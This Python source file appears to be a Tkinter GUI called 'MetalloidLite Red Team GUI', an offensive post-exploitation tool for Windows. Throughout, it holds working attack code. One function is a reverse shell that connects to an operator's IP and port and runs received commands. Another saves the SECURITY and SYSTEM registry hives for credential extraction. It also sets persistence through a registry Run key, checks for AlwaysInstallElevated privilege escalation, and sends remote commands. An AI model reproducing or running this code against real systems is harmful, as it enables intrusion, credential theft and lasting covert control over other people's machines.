import tkinter as tk
from tkinter import scrolledtext
import subprocess
import platform
import ctypes
import socket
import getpass
import winreg
import threading
import socket


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
    except Exception as e:
        return f"Error: {e}"

remote_cmd_socket = None

def connect_remote():
    global remote_cmd_socket
    ip = ip_entry.get()
    port = int(port_entry.get())
    try:
        remote_cmd_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_cmd_socket.connect((ip, port))
        log_output(f"[+] Connected to remote {ip}:{port}")
    except Exception as e:
        log_output(f"[!] Connection failed: {e}")

def send_remote_command():
    global remote_cmd_socket
    if not remote_cmd_socket:
        log_output("[!] Not connected to remote server.")
        return
    cmd = remote_cmd_entry.get()
    if cmd.strip() == "":
        return
    try:
        remote_cmd_socket.sendall(cmd.encode())
        data = remote_cmd_socket.recv(4096).decode()
        log_output(f"> {cmd}\n{data}")
    except Exception as e:
        log_output(f"[!] Error sending command: {e}")

def log_output(output):
    output_box.config(state='normal') 
    output_box.insert(tk.END, output + "\n")
    output_box.see(tk.END)
    output_box.config(state='disabled')

def run_in_thread(fn):
    threading.Thread(target=fn, daemon=True).start()

# === MODULES ===

def sys_info():
    info = {
        "Hostname": platform.node(),
        "Username": getpass.getuser(),
        "OS": f"{platform.system()} {platform.release()}",
        "Arch": platform.architecture()[0],
        "IsAdmin": "Yes" if is_admin() else "No"
    }
    log_output("[*] SYSTEM INFO")
    for k, v in info.items():
        log_output(f"{k}: {v}")

def check_always_install_elevated():
    log_output("[*] AlwaysInstallElevated check:")
    keys = [
        r'HKCU\Software\Policies\Microsoft\Windows\Installer',
        r'HKLM\Software\Policies\Microsoft\Windows\Installer'
    ]
    for k in keys:
        out = run_command(f'reg query {k} /v AlwaysInstallElevated')
        log_output(out or "[!] Not found.")

def dump_lsa_secrets():
    if not is_admin():
        log_output("[!] Admin privileges required.")
        return
    run_command('reg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY')
    run_command('reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM')
    log_output("[+] Saved SECURITY and SYSTEM hives to C:\\Windows\\Temp")

def reverse_shell():
    ip = ip_entry.get()
    port = int(port_entry.get())
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"[+] MetalloidShell Connected\n")
        while True:
            data = s.recv(1024).decode().strip()
            if data == "exit": break
            result = run_command(data)
            s.send(result.encode())
        s.close()
    except Exception as e:
        log_output(f"[!] Reverse shell failed: {e}")

def persistence():
    exe = "pythonw.exe"
    script_path = __file__
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MetalloidPersist", 0, winreg.REG_SZ, f"{exe} {script_path}")
        winreg.CloseKey(key)
        log_output("[+] Persistence set (registry run key).")
    except:
        log_output("[!] Failed to set persistence.")

# === GUI ===

root = tk.Tk()
root.title("MetalloidLite Red Team GUI")
root.geometry("700x500")

frame = tk.Frame(root)
frame.pack(pady=5)

# Row 0 buttons
btn1 = tk.Button(frame, text="System Info", command=lambda: run_in_thread(sys_info))
btn1.grid(row=0, column=0, padx=5)

btn2 = tk.Button(frame, text="Privesc Check", command=lambda: run_in_thread(check_always_install_elevated))
btn2.grid(row=0, column=1, padx=5)

btn3 = tk.Button(frame, text="Dump LSA Secrets", command=lambda: run_in_thread(dump_lsa_secrets))
btn3.grid(row=0, column=2, padx=5)

btn4 = tk.Button(frame, text="Set Persistence", command=lambda: run_in_thread(persistence))
btn4.grid(row=0, column=3, padx=5)

btn5 = tk.Button(frame, text="Reverse Shell", command=lambda: run_in_thread(reverse_shell))
btn5.grid(row=0, column=4, padx=5)

# Row 1: Remote connect + command send
connect_btn = tk.Button(frame, text="Connect Remote", command=lambda: run_in_thread(connect_remote))
connect_btn.grid(row=1, column=0, padx=5, pady=5)

remote_cmd_entry = tk.Entry(frame, width=50)
remote_cmd_entry.grid(row=1, column=1, padx=5, pady=5)

send_cmd_btn = tk.Button(frame, text="Send Command", command=lambda: run_in_thread(send_remote_command))
send_cmd_btn.grid(row=1, column=2, padx=5, pady=5)

# IP + Port input (packed below frame)
ip_entry = tk.Entry(root, width=20)
ip_entry.insert(0, "127.0.0.1")
ip_entry.pack()

port_entry = tk.Entry(root, width=10)
port_entry.insert(0, "4444")
port_entry.pack()

# Output box fills the rest of the window
output_box = scrolledtext.ScrolledText(root, state='disabled', height=20, bg='black', fg='lime', font=('Consolas', 10))
output_box.pack(fill=tk.BOTH, expand=True)

root.mainloop()
